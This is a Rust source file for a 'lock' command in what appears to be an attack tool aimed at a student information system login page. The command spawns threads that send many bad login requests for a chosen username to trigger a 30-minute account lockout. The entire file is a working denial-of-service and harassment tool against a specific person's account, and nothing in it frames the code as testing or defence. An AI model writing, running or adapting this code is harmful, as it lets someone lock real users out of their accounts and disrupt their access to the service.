// STD modules
use std::io::Write;
use std::thread;
use std::time::Duration;
use std::time::SystemTime;

// External Crates
use ureq::Agent;

// Internal Modules
use super::super::arg_parse;
use super::super::BASE_PAGE;
use super::color;
use super::color::Color;
use super::common;
use super::Command;

static SPINNER: [char; 10] = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];

static mut RUNNING: i32 = 0;
static mut REQUESTS: u32 = 0;

pub fn command() -> Command {
    Command::new(
        "lock",
        "Lock an account for 30 min by sending lots of login requests",
        "lock <username> [-t Threads] [-r Requests] [-p Password] [--page BasePage]",
        |args| {
            if args.len() <= 2 {
                color_print!(Color::Red, "[*] Not enough args supplied");
                return;
            }

            // Parse the args
            let threads: &u32 = &arg_parse::get_arg_value(args, "-t")
                .unwrap_or("3")
                .parse::<u32>()
                .unwrap();

            let requests: &u32 = &arg_parse::get_arg_value(args, "-r")
                .unwrap_or("15")
                .parse::<u32>()
                .unwrap();

            let password: &str = arg_parse::get_arg_value(args, "-p").unwrap_or("🔒");

            let base_page: &str = arg_parse::get_arg_value(args, "--page").unwrap_or(BASE_PAGE);

            // Get Username
            let username: String = match common::get_username(args) {
                Some(username) => username,
                None => {
                    color_print!(Color::Red, "[*] No username supplied");
                    return;
                }
            };
            if !common::is_valid_email(&username) {
                color_print!(
                    Color::Red,
                    "[-] The username supplied is not a valid Email..."
                );
            }

            color_print!(
                Color::Green,
                "\n[*] Starting Crack on {}",
                &color::color(&username, Color::Blue)
            );

            color_print!(Color::Magenta, "[i] Threads: {}", &threads.to_string());
            color_print!(Color::Magenta, "[i] Requests: {}", &requests.to_string());
            color_print!(Color::Magenta, "[i] Password: {}", password);
            color_print!(Color::Magenta, "[i] Base Page: {}", base_page);
            println!();

            lock(&username, password, base_page, threads, requests);
        },
    )
}

fn lock(username: &str, password: &str, base_page: &str, threads: &u32, requests: &u32) {
    // Start the timer
    let start_time = SystemTime::now();

    let mut system: System = System::new(
        username.to_string(),
        base_page.to_string(),
        *requests,
        *threads,
    );

    let login_page: String = format!("{}/sis/j_security_check", system.base_page);
    let mut total_reqs: u32 = 0;
    for _ in 1..system.threads + 1 {
        let mut requests = system.req_count / system.threads;
        if system.req_count % system.threads > 0 {
            requests += 1;
        }
        total_reqs += requests;
        system.add_locker(Locker::new(
            &system.username,
            password,
            &login_page,
            requests,
        ));
        if total_reqs >= system.req_count {
            break;
        }
    }

    // Start Threads
    for mut i in system.lockers {
        unsafe {
            RUNNING += 1;
        }
        thread::spawn(move || {
            (i).lock();
        });
    }

    // Show nice info to the user while the threads are running
    'main: loop {
        for i in SPINNER.iter() {
            if unsafe { RUNNING } == 0 {
                break 'main;
            }
            let per_done = (unsafe { REQUESTS } as f32 / total_reqs as f32 * 100.0) as u32;
            print!(
                "\r{} {}",
                color::color(&format!("[{}] Locking", i), Color::Cyan),
                color::color(&format!("( {}% )", per_done), Color::Blue),
            );
            std::io::stdout().flush().expect("Err flushing STD Out");
            thread::sleep(Duration::from_millis(100));
        }
    }
    print!(
        "{}",
        color::color(
            &format!(
                "\r[*] All Done - Took {}s",
                &start_time.elapsed().unwrap().as_secs()
            ),
            Color::Green
        )
    );
}

struct Locker {
    page: String,
    password: String,
    username: String,
    req_count: u32,
}

struct System {
    username: String,
    base_page: String,
    req_count: u32,
    threads: u32,
    lockers: Vec<Locker>,
}

impl Locker {
    fn new(username: &str, password: &str, page: &str, req_count: u32) -> Locker {
        Locker {
            page: page.to_string(),
            password: password.to_string(),
            username: username.to_string(),
            req_count,
        }
    }

    fn lock(&mut self) {
        for _ in 0..self.req_count {
            let agent = Agent::new();

            let _ = agent.get(&format!("{}/login", BASE_PAGE)).call();
            let _ = agent
                .post(&self.page)
                .query("j_username", &self.username)
                .query("j_password", &self.password)
                .call();
            unsafe {
                REQUESTS += 1;
            }
        }
        unsafe {
            RUNNING -= 1;
        }
    }
}

impl System {
    fn new(username: String, base_page: String, req_count: u32, threads: u32) -> System {
        System {
            username,
            base_page,
            req_count,
            threads,
            lockers: Vec::new(),
        }
    }

    fn add_locker(&mut self, locker: Locker) {
        self.lockers.push(locker);
    }
}
